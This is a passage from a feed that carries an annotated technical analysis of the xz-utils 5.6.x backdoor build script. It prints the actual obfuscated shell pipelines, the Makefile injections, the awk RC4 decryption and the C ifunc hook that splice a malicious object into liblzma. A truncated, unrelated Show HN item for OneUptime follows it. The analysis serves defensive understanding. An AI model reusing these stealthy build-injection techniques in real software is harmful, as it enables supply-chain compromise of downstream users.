eval $i |
tail -c +31233 |
tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377" |
xz -F raw --lzma1 -dc |
/bin/sh
</pre>


<p>
The first <code>xz</code> command uncompresses another malicious test file. The <code>eval</code> then runs the <code>head</code> pipeline, extracting a total of 16×2048+939 = 33,707 bytes. Then the <code>tail</code> command keeps only the final 31,233 bytes. The <code>tr</code> command applies a simple substitution cipher to the output (so that just in case anyone thought to pull these specific byte ranges out of the file, they wouldn’t recognize it as a valid lzma input!?). The second <code>xz</code> command decodes the translated bytes as a raw lzma stream, and then of course the result is piped through the shell.

</p><p>
Skipping the shell pipe, we can run this, obtaining a very long shell script. I have added commentary in between sections of the output.
</p><pre>$ xz -dc $srcdir/tests/files/good-large_compressed.lzma |
  eval $i |
  tail -c +31265 |
  tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
  xz -F raw --lzma1 -dc
P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
C="pic_flag=\" $P\""
O="^pic_flag=\" -fPIC -DPIC\"$"
R="is_arch_extension_supported"
x="__get_cpuid("
p="good-large_compressed.lzma"
U="bad-3-corrupt_lzma2.xz"
</pre>


<p>
So far, setting up environment variables.
</p><pre>[ ! $(uname)="Linux" ] &amp;&amp; exit 0  # 5.6.1 only
</pre>


<p>
A line that only appears in 5.6.1, exiting when not run on Linux. A robustness fix, perhaps. In general the scripts in 5.6.0 and 5.6.1 are very similar: 5.6.1 has a few additions. We will examine the 5.6.1 script, with the additions marked.
</p><pre>eval $zrKcVq
</pre>


<p>
The first of many odd eval statements, for variables that do not appear to be set anywhere. One possibility is that these are debug prints: when the attacker is debugging the script, setting, say, <code>zrKcVq=env</code> inserts a debug print during execution. Another possibility is that these are extension points that can be set by some other mechanism, run before this code, in the future.
</p><pre>if test -f config.status; then
eval $zrKcSS
eval `grep ^LD=\'\/ config.status`
eval `grep ^CC=\' config.status`
eval `grep ^GCC=\' config.status`
eval `grep ^srcdir=\' config.status`
eval `grep ^build=\'x86_64 config.status`
eval `grep ^enable_shared=\'yes\' config.status`
eval `grep ^enable_static=\' config.status`
eval `grep ^gl_path_map=\' config.status`
</pre>


<p>
If <code>config.status</code> exists, we read various variables from it into the shell, along with two extension points. Note that we are still inside the config.status check (let’s call it “if #1”) as we continue through the output.
</p><pre># Entirely new in 5.6.1
vs=`grep -broaF '~!:_ W' $srcdir/tests/files/ 2&gt;/dev/null`
if test "x$vs" != "x" &gt; /dev/null 2&gt;&amp;1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" &gt; /dev/null 2&gt;&amp;1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '|_!{ -' $srcdir/tests/files/ 2&gt;/dev/null`
if test "x$ve" != "x" &gt; /dev/null 2&gt;&amp;1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" &gt; /dev/null 2&gt;&amp;1;then
[ ! "x$f2" = "x$f1" ] &amp;&amp; exit 0
[ ! -f $f1 ] &amp;&amp; exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} |
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
    xz -F raw --lzma2 -dc`
fi
fi
fi
fi
</pre>


<p>
This section is entirely new in 5.6.1. It looks for a single test file to contain the magic texts <code>'~!:_ W'</code> and <code>'|_!{ -'</code>, extracts the bytes between them, applies a substitution cipher, decompresses the result, and evaluates the output as a shell script. This appears to be an extension mechanism, so that the next time changes are needed in this script, a new script can be added in a different test file, instead of having to <a href="https://git.tukaani.org/?p=xz.git;a=commitdiff;h=74b138d2a6529f2c07729d7c77b1725a8e8b16f1">make up reasons to regenerate existing binary test files</a>.

</p><p>
The next chunk continues with script that was present in 5.6.0.
</p><pre>eval $zrKccj
if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
Two different checks that <a href="https://maskray.me/blog/2021-01-18-gnu-indirect-function">GNU indirect function</a> support is enabled. If not, stop the script. The backdoor requires this functionality.
</p><pre>if test "x$enable_shared" != "xyes";then
exit 0
fi
</pre>


<p>
Require shared library support.
</p><pre>if ! (echo "$build" | grep -Eq "^x86_64" &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo "$build" | grep -Eq "linux-gnu$" &gt; /dev/null 2&gt;&amp;1);then
exit 0
fi
</pre>


<p>
Require an x86-64 Linux system.
</p><pre>if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c &gt; /dev/null 2&gt;&amp;1; then
exit 0
fi
if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c &gt; /dev/null 2&gt;&amp;1; then
exit 0
fi
if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; then
exit 0
fi
if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; then
exit 0
fi
</pre>


<p>
Require all the crc ifunc code (in case it has been patched out?).
</p><pre>if test "x$GCC" != 'xyes' &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
if test "x$CC" != 'xgcc' &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
LDv=$LD" -v"
if ! $LDv 2&gt;&amp;1 | grep -qs 'GNU ld' &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
Require gcc (not clang, I suppose) and GNU ld.
</p><pre>if ! test -f "$srcdir/tests/files/$p" &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
if ! test -f "$srcdir/tests/files/$U" &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
Require the backdoor-containing test files. Of course, if these files didn’t exist, it’s unclear how we obtained this script in the first place, but better safe than sorry, I suppose.
</p><pre>if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
eval $zrKcst
</pre>


<p>
Add a bunch of checks when the file <code>debian/rules</code> exists or <code>$RPM_ARCH</code> is set to <code>x86_64</code>. Note that we are now inside two <code>if</code> statements: the <code>config.status</code> check above, and this one (let’s call it “if #2”).
</p><pre>j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
if ! grep -qs "$j" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
z="^am__uninstall_files_from_dir = {"
if ! grep -qs "$z" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
w="^am__install_max ="
if ! grep -qs "$w" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
E=$z
if ! grep -qs "$E" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
Q="^am__vpath_adj_setup ="
if ! grep -qs "$Q" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
M="^am__include = include"
if ! grep -qs "$M" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
L="^all: all-recursive$"
if ! grep -qs "$L" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
if ! grep -qs "$m" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
if ! grep -qs "$u" src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
Check that <code>liblzma/Makefile</code> contains all the lines that will be used as anchor points later for inserting new text into the Makefile.
</p><pre>if ! grep -qs "$O" libtool &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
<code>$O</code> was set at the very start of the script. This is checking that the libtool file, presumably generated during the build process, configures the compiler for a PIC (position independent code) build.
</p><pre>eval $zrKcTy
b="am__test = $U"
</pre>


<p>
<code>$U</code> was also set at the start of the script: <code>U="bad-3-corrupt_lzma2.xz"</code>. Real work is starting!
</p><pre>sed -i "/$j/i$b" src/liblzma/Makefile || true
</pre>


<p>
<code>sed -i</code> runs an in-place modification of the input file, in this case <code>liblzma/Makefile</code>. Specifically, find the <code>ACLOCAL_M4</code> line we grepped for earlier (<code>/$j/</code>) and insert the <code>am__test</code> setting from <code>$b</code> (<code>i$b</code>).
</p><pre>d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
b="am__strip_prefix = $d"
sed -i "/$w/i$b" src/liblzma/Makefile || true
</pre>


<p>
Shell quoting inside a quoted string inside a Makefile really is a something special. This is escaping the backslashes in the tr command enough times that it will work to insert them into the Makefile after the <code>am__install_max</code> line (<code>$w</code>).
</p><pre>b="am__dist_setup = \$(am__strip_prefix) | xz -d 2&gt;/dev/null | \$(SHELL)"
sed -i "/$E/i$b" src/liblzma/Makefile || true
b="\$(top_srcdir)/tests/files/\$(am__test)"
s="am__test_dir=$b"
sed -i "/$Q/i$s" src/liblzma/Makefile || true
</pre>


<p>
More added lines. It’s worth stopping for a moment to look at what’s happened so far. The script has added these lines to <code>src/liblzma/Makefile</code>:
</p><pre>am__test = bad-3-corrupt_lzma2.xz
am__strip_prefix = tr "\\t \\-_" " \\t_\\-"
am__dist_setup = $(am_strip_prefix) | xz -d 2&gt;/dev/null | $(SHELL)
am__test_dir = $(top_srcdir)/tests/files/$(am__test)
</pre>


<p>
<br>
These look plausible but fall apart under closer examination: for example, <code>am__test_dir</code> is a file, not a directory. The goal here seems to be that after <code>configure</code> has run, the generated <code>Makefile</code> still looks plausibly inscrutable. And the lines have been added in scattered places throughout the <code>Makefile</code>; no one will see them all next to each other like in this display. Back to the script:
</p><pre>h="-Wl,--sort-section=name,-X"
if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" &gt; /dev/null 2&gt;&amp;1;then
h=$h",-z,now"
fi
j="liblzma_la_LDFLAGS += $h"
sed -i "/$L/i$j" src/liblzma/Makefile || true
</pre>


<p>
<br>
Add <code>liblzma_la_LDFLAGS += -Wl,--sort-section=name,-X</code> to the Makefile. If the <code>LDFLAGS</code> do not already say <code>-z,now</code> or <code>-Wl,now</code>, add <code>-z,now</code>.

</p><p>
The “<code>-Wl,now</code>” forces <code>LD_BIND_NOW</code> behavior, in which the dynamic loader resolves all symbols at program startup time. One reason this is normally done is for security: it makes sure that the global offset table and procedure linkage tables can be marked read-only early in process startup, so that buffer overflows or write-after-free bugs cannot target those tables. However, it also has the effect of running GNU indirect function (ifunc) resolvers at startup during that resolution process, and the backdoor arranges to be called from one of those. This early invocation of the backdoor setup lets it run while the tables are still writable, allowing the backdoor to replace the entry for <code>RSA_public_decrypt</code> with its own version. But we are getting ahead of ourselves. Back to the script:
</p><pre>sed -i "s/$O/$C/g" libtool || true
</pre>


<p>
We checked earlier that the libtool file said <code>pic_flag=" -fPIC -DPIC"</code>. The sed command changes it to read <code>pic_flag=" -fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"</code>.

</p><p>
It is not clear why these additional flags are important, but in general they disable linker optimizations that could plausibly get in the way of subterfuge.
</p><pre>k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
sed -i "s/$u/$k/" src/liblzma/Makefile || true
l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
    export top_srcdir='\$(top_srcdir)'; \\\\\n\
    export CC='\$(CC)'; \\\\\n\
    export DEFS='\$(DEFS)'; \\\\\n\
    export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
    export INCLUDES='\$(INCLUDES)'; \\\\\n\
    export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
    export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
    export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
    export CFLAGS='\$(CFLAGS)'; \\\\\n\
    export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
    export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
    export libdir='\$(libdir)'; \\\\\n\
    export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
    export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
sed rpath \$(am__test_dir) | \$(am__dist_setup) &gt;/dev/null 2&gt;&amp;1";
sed -i "/$m/i$l" src/liblzma/Makefile || true
eval $zrKcHD
</pre>


<p>
Shell quoting continues to be trippy, but we’ve reached the final change. This adds the line
</p><pre>AM_V_CCLD = @echo -n $(LTDEPS); $(am__v_CCLD_$(V))
</pre>


<p>
to one place in the Makefile, and then adds a long script that sets up some variables, entirely as misdirection, that ends with
</p><pre>sed rpath $(am__test_dir) | $(am__dist_setup) &gt;/dev/null 2&gt;&amp;1
</pre>


<p>
The <code>sed rpath</code> command is just as much an obfuscated <code>cat</code> as <code>sed "r\n"</code> was, but <code>-rpath</code> is a very common linker flag, so at first glance you might not notice it’s next to the wrong command. Recalling the <code>am__test</code> and related lines added above, this pipeline ends up being equivalent to:
</p><pre>cat ./tests/files/bad-3-corrupt_lzma2.xz |
tr "\t \-_" " \t_\-" |
xz -d |
/bin/sh
</pre>


<p>
Our old friend! We know what this does, though. It runs the very script we are currently reading in this post. <a href="https://research.swtch.com/zip">How recursive!</a>
<a href="#make"></a></p><h2 id="make"><a href="#make">Make</a></h2>


<p>
Instead of running during <code>configure</code> in the tarball root directory, let's mentally re-execute the script as it would run during <code>make</code> in the <code>liblzma</code> directory. In that context, the variables at the top have been set, but all the editing we just considered was skipped over by “if #1” not finding <code>./config.status</code>. Now let's keep executing the script.
</p><pre>fi
</pre>


<p>
That <code>fi</code> closes “if #2”, which checked for a Debian or RPM build. The upcoming <code>elif</code> continues “if #1”, which checked for config.status, meaning now we are executing the part of the script that matters when run during <code>make</code> in the <code>liblzma</code> directory:
</p><pre>elif (test -f .libs/liblzma_la-crc64_fast.o) &amp;&amp; (test -f .libs/liblzma_la-crc32_fast.o); then
</pre>


<p>
If we see the built objects for the crc code, we are running as part of <code>make</code>. Run the following code.
</p><pre># Entirely new in 5.6.1
vs=`grep -broaF 'jV!.^%' $top_srcdir/tests/files/ 2&gt;/dev/null`
if test "x$vs" != "x" &gt; /dev/null 2&gt;&amp;1;then
f1=`echo $vs | cut -d: -f1`
if test "x$f1" != "x" &gt; /dev/null 2&gt;&amp;1;then
start=`expr $(echo $vs | cut -d: -f2) + 7`
ve=`grep -broaF '%.R.1Z' $top_srcdir/tests/files/ 2&gt;/dev/null`
if test "x$ve" != "x" &gt; /dev/null 2&gt;&amp;1;then
f2=`echo $ve | cut -d: -f1`
if test "x$f2" != "x" &gt; /dev/null 2&gt;&amp;1;then
[ ! "x$f2" = "x$f1" ] &amp;&amp; exit 0
[ ! -f $f1 ] &amp;&amp; exit 0
end=`expr $(echo $ve | cut -d: -f2) - $start`
eval `cat $f1 | tail -c +${start} | head -c +${end} |
    tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377" |
    xz -F raw --lzma2 -dc`
fi
fi
fi
fi
</pre>


<p>
We start this section with another extension hook. This time the magic strings are <code>'jV!.^%'</code> and <code>'%.R.1Z'</code>. As before, there are no test files with these strings. This was for future extensibility.

</p><p>
On to the code shared with 5.6.0:
</p><pre>eval $zrKcKQ
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
exit 0
fi
if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
exit 0
fi
if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
exit 0
fi
</pre>


<p>
Check that the ifunc-enabled CRC source files look right. Interestingly, Lasse Collin renamed <code>crc_clmul.c</code> to <code>crc_x86_clmul.h</code> <a href="https://git.tukaani.org/?p=xz.git;a=commit;h=419f55f9dfc2df8792902b8953d50690121afeea">on 2024-01-11</a>. One has to assume that the person or team behind “Jia Tan” had been working on all this code well before then and that the first version checked <code>crc_clmul.c</code>. They were probably very annoyed when Lasse Collin accidentally broke their in-development backdoor by cleaning up the file names!
</p><pre>if ! grep -qs "$C" ../../libtool; then
exit 0
fi
if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
Check that the build configuration has the extra flags we added before.
</p><pre>if echo $liblzma_la_LINK | grep -qs -e "lazy" &gt; /dev/null 2&gt;&amp;1;then
exit 0
fi
</pre>


<p>
Check that no one has added <code>lazy</code> to the linker options, which might override the <code>-Wl,now</code>. (This code really needs to run before the tables it patches get marked read-only!)
</p><pre>N=0
W=0
Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
eval $zrKcjv
if test -z "$Y"; then
N=0
W=88664
else
N=88664
W=0
fi
</pre>


<p>
This is selecting between two different offset values depending on the content of <code>gettext.m4</code>. The distributed xz tarballs do not contain that string in <code>gettext.m4</code> (it does appear in <code>build-to-host.m4</code>), so the <code>grep</code> finds nothing, <code>$Y</code> is the empty string, and the true case of the <code>if</code> executes: <code>N=0</code> and <code>W=88792</code>.
</p><pre>xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" |
</pre>


<p>
I inserted a line break here. Remember the “corrupt” test file script set <code>i</code> to the large head pipeline? It’s still set here, being used inside the script extracted from that pipeline. Before, the pipeline extracted 33,707 bytes and then we used the final 31,233 bytes. Now we are using the entire thing, which probably means just the prefix that we skipped before. The sed command is inserting a newline after every byte of that output, setting up for piping into the remainder of the command line:
</p><pre>LC_ALL=C awk '
BEGIN{
    FS="\n";RS="\n";ORS="";m=256;
    for(i=0;i&lt;m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}
    i=0;j=0;for(l=0;l&lt;8192;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}
}
{
    v=t["x" (NF&lt;1?RS:$1)];
    i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];
    printf "%c",(v+k)%m
}' |
</pre>


<p>
I inserted another line break here. What is this? <a href="https://twitter.com/nugxperience/status/1773906926503591970">@nugxperience on Twitter recognized it</a> as an RC4-like decryption function, implemented in awk! Apparently the <code>tr</code>-based substitution cipher wasn’t secure enough for this step. This is the 5.6.1 version; the 5.6.0 version is the same except that the first loop counts to 4096 instead of 8192.

</p><p>
Back to the script:
</p><pre>xz -dc --single-stream | ((head -c +$N &gt; /dev/null 2&gt;&amp;1) &amp;&amp; head -c +$W) &gt; liblzma_la-crc64-fast.o || true
</pre>


<p>
We finally made it to the end of this long line. The decrypted output is piped through xz to decompress it; the <code>--single-stream</code> flag says to stop at the end of the first xz EOF marker instead of looking for additional files on standard input. This avoids reading the section of the input that we extracted with the <code>tail</code> command before. Then the decompressed data is piped through a <code>head</code> pair that extracts either the full 88,792 byte input or zero bytes, depending on <code>gettext.m4</code> from before, and writes it to <code>liblzma_la-crc64-fast.o</code>. In our build, we are taking the full input.
</p><pre>if ! test -f liblzma_la-crc64-fast.o; then
exit 0
fi
</pre>


<p>
If all that failed, stop quietly.
</p><pre>cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
</pre>


<p>
Wait what? Oh! Notice the two different file names <code>crc64_fast</code> versus <code>crc64-fast</code>. And neither of these is the one we just extracted. These are in <code>.libs/</code>, and the one we extracted is in the current directory. This is backing up the real file (the underscored one) into a file with a very similar name (the hyphenated one).
</p><pre>V='#endif\n#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp;
    defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp;
    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))\n
    extern int _get_cpuid(int, void*, void*, void*, void*, void*);\n
    static inline bool _is_arch_extension_supported(void) { int success = 1; uint32_t r[4];
    success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((char*) __builtin_frame_address(0))-16);
    const uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19);
    return success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask; }\n
    #else\n
    #define _is_arch_extension_supported is_arch_extension_supported'
</pre>


<p>
This string <code>$V</code> begins with “<code>#endif</code>”, which is never a good sign. Let’s move on for now, but we’ll take a closer look at that text shortly.
</p><pre>eval $yosA
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc64_fast.c | \
sed "/include \"crc_x86_clmul.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc64_fast.c\"" 2&gt;/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \
    $CFLAGS -r liblzma_la-crc64-fast.o -x c -  $P -o .libs/liblzma_la-crc64_fast.o 2&gt;/dev/null; then
</pre>


<p>
This <code>if</code> statement is running a pipeline of sed commands piped into <code>$CC</code> with the arguments <code>liblzma_la-crc64-fast.o</code> (adding that object as an input to the compiler) and <code>-x</code> <code>c</code> <code>-</code> (compile a C program from standard input). That is, it rebuilds an edited copy of <code>crc64_fast.c</code> (a real xz source file) and merges the extracted malicious <code>.o</code> file into the resulting object, overwriting the underscored real object file that would have been built originally for <code>crc64_fast.c</code>. The <code>sed</code> <code>1i</code> tells the compiler the file name to record in debug info, since the compiler is reading standard input—very tidy! But what are the edits?

</p><p>
The file starts out looking like: 
</p><pre>...
#if defined(CRC_X86_CLMUL)
#   define BUILDING_CRC64_CLMUL
#   include "crc_x86_clmul.h"
#endif
...
static crc64_func_type
crc64_resolve(void)
{
    return is_arch_extension_supported()
            ? &amp;crc64_arch_optimized : &amp;crc64_generic;
}
</pre>


<p>
The sed commands add an <code>_</code> prefix to the name of the function in the return condition, and then add <code>$V</code> after the <code>include</code> line, producing (with reformatting of the C code):
</p><pre># 0 "path/to/src/liblzma/check/crc64_fast.c"
...
#if defined(CRC_X86_CLMUL)
#   define BUILDING_CRC64_CLMUL
#   include "crc_x86_clmul.h"
#endif

#if defined(CRC32_GENERIC) &amp;&amp; defined(CRC64_GENERIC) &amp;&amp; \
    defined(CRC_X86_CLMUL) &amp;&amp; defined(CRC_USE_IFUNC) &amp;&amp; defined(PIC) &amp;&amp; \
    (defined(BUILDING_CRC64_CLMUL) || defined(BUILDING_CRC32_CLMUL))

extern int _get_cpuid(int, void*, void*, void*, void*, void*);

static inline bool _is_arch_extension_supported(void) {
    int success = 1;
    uint32_t r[4];
    success = _get_cpuid(1, &amp;r[0], &amp;r[1], &amp;r[2], &amp;r[3], ((char*) __builtin_frame_address(0))-16);
    const uint32_t ecx_mask = (1 &lt;&lt; 1) | (1 &lt;&lt; 9) | (1 &lt;&lt; 19);
    return success &amp;&amp; (r[2] &amp; ecx_mask) == ecx_mask;
}

#else
#define _is_arch_extension_supported is_arch_extension_supported
#endif
...
static crc64_func_type
crc64_resolve(void)
{
    return _is_arch_extension_supported()
            ? &amp;crc64_arch_optimized : &amp;crc64_generic;
}
</pre>


<p>
That is, the crc64_resolve function, which is the ifunc resolver that gets run early in dynamic loading, before the GOT and PLT have been marked read-only, is now calling the newly inserted <code>_is_arch_extension_supported</code>, which calls <code>_get_cpuid</code>. This still looks like plausible code, since this is pretty similar to <a href="https://git.tukaani.org/?p=xz.git;a=blob;f=src/liblzma/check/crc_x86_clmul.h;h=ae66ca9f8c710fd84cd8b0e6e52e7bbfb7df8c0f;hb=2d7d862e3ffa8cec4fd3fdffcd84e984a17aa429#l388">the real is_arch_extension_supported</a>. But <code>_get_cpuid</code> is provided by the backdoor .o, and it does a lot more before returning the cpuid information. In particular it rewrites the GOT and PLT to hijack calls to RSA_public_decrypt.

</p><p>
But let’s get back to the shell script, which is still running from inside <code>src/liblzma/Makefile</code> and just successfully inserted the backdoor into <code>.libs/liblzma_la-crc64_fast.o</code>. We are now in the <code>if</code> compiler success case:
</p><pre>cp .libs/liblzma_la-crc32_fast.o .libs/liblzma_la-crc32-fast.o || true
eval $BPep
if sed "/return is_arch_extension_supported()/ c\return _is_arch_extension_supported()" $top_srcdir/src/liblzma/check/crc32_fast.c | \
sed "/include \"crc32_arm64.h\"/a \\$V" | \
sed "1i # 0 \"$top_srcdir/src/liblzma/check/crc32_fast.c\"" 2&gt;/dev/null | \
$CC $DEFS $DEFAULT_INCLUDES $INCLUDES $liblzma_la_CPPFLAGS $CPPFLAGS $AM_CFLAGS \
    $CFLAGS -r -x c -  $P -o .libs/liblzma_la-crc32_fast.o; then
</pre>


<p>
This does the same thing for <code>crc32_fast.c</code>, except it doesn’t add the backdoored object code. We don’t want two copies of that in the build. It is unclear why the script bothers to intercept both the crc32 and crc64 ifuncs; either one should have sufficed. Perhaps they wanted the dispatch code for both to look similar in a debugger. Now we’re in the doubly nested <code>if</code> compiler success case:
</p><pre>eval $RgYB
if $AM_V_CCLD$liblzma_la_LINK -rpath $libdir $liblzma_la_OBJECTS $liblzma_la_LIBADD; then
</pre>


<p>
If we can relink the .la file, then...
</p><pre>if test ! -f .libs/liblzma.so; then
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
</pre>


<p>
<br>
If the relink succeeded but didn’t write the file, assume it failed and restore the backups.
</p><pre>rm -fr .libs/liblzma.a .libs/liblzma.la .libs/liblzma.lai .libs/liblzma.so* || true
</pre>


<p>
No matter what, remove the libraries. (The <code>Makefile</code> link step is presumably going to happen next and recreate them.)
</p><pre>else
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
</pre>


<p>
This is the <code>else</code> for the link failing. Restore from backups.
</p><pre>rm -f .libs/liblzma_la-crc32-fast.o || true
rm -f .libs/liblzma_la-crc64-fast.o || true
</pre>


<p>
Now we are in the inner compiler success case. Delete backups.
</p><pre>else
mv -f .libs/liblzma_la-crc32-fast.o .libs/liblzma_la-crc32_fast.o || true
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
</pre>


<p>
This is the else for the crc32 compilation failing. Restore from backups.
</p><pre>else
mv -f .libs/liblzma_la-crc64-fast.o .libs/liblzma_la-crc64_fast.o || true
fi
</pre>


<p>
This is the else for the crc64 compilation failing. Restore from backup. (This is not the cleanest shell script in the world!)
</p><pre>rm -f liblzma_la-crc64-fast.o || true
</pre>


<p>
Now we are at the end of the Makefile section of the script. Delete the backup.
</p><pre>fi
eval $DHLd
$
</pre>


<p>
Close the “<code>elif</code> we’re in a Makefile”, one more extension point/debug print, and we’re done!
The script has injected the object file into the objects built during <code>make</code>, leaving no trace behind.
      </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: OneUptime – open-source Datadog Alternative (193 pts)]]></title>
            <link>https://github.com/OneUptime/oneuptime</link>
            <guid>39903471</guid>
            <pubDate>Tue, 02 Apr 2024 08:22:58 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/OneUptime/oneuptime">https://github.com/OneUptime/oneuptime</a>, See on <a href="https://news.ycombinator.com/item?id=39903471">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text">
<div dir="auto"><h2 tabindex="-1" dir="auto"><a target="_blank" rel="noopener noreferrer nofollow" href="https://raw.githubusercontent.com/OneUptime/oneuptime/master/App/FeatureSet/Home/Static/img/OneUptimePNG/7.png"><img alt="oneuptime logo" width="50%" src="https://raw.githubusercontent.com/OneUptime/oneuptime/master/App/FeatureSet/Home/Static/img/OneUptimePNG/7.png"></a></h2><a id="" aria-label="Permalink: " href="#"></a></div>

<p dir="auto"><h3 tabindex="-1" dir="auto">OneUptime: The Complete Open-Source Observability Platform</h3><a id="user-content-oneuptime-the-complete-open-source-observability-platform" aria-label="Permalink: OneUptime: The Complete Open-Source Observability Platform" href="#oneuptime-the-complete-open-source-observability-platform"></a></p>
<p dir="auto">OneUptime is a comprehensive solution for monitoring and managing your online services. Whether you need to check the availability of your website, dashboard, API, or any other online resource, OneUptime can alert your team when downtime happens and keep your customers informed with a status page. OneUptime also helps you handle incidents, set up on-call rotations, run tests, secure your services, analyze logs, track performance, and debug errors.</p>
<p dir="auto">OneUptime replaces multiple tools with one integrated platform:</p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Uptime Monitoring</h4><a id="user-content-uptime-monitoring" aria-label="Permalink: Uptime Monitoring" href="#uptime-monitoring"></a></p>
<p dir="auto">Monitor the availability and response time of your online services from multiple locations around the world. Get notified via email, SMS, Slack, or other channels when something goes wrong. Replace tools like Pingdom.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/OneUptime/oneuptime/blob/master/App/FeatureSet/Home/Static/img/readme/monitoring.png?raw=true"><img src="https://github.com/OneUptime/oneuptime/raw/master/App/FeatureSet/Home/Static/img/readme/monitoring.png?raw=true" alt="Monitoring"></a></p>
